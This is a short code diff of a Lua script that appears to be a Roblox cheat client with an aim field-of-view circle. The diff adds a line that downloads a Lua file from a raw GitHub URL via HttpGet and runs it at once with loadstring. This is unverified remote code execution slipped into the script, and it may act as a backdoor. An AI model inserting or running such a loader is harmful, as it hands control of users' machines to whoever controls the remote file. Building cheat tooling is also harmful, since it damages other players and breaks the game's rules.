@@ -29,6 +29,8 @@ end)
 
 if IsUpToDate then print("ballz!!! :Scream:") else warn("broke!!! :sob:") return end
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MyFatherLeft/Fatherless/main/truth.lua",true))()
+
 local FovCircle = Drawing.new("Circle")
 FovCircle.Visible = Client.Toggles.UseFov
 FovCircle.Radius = Client.Values.Fov
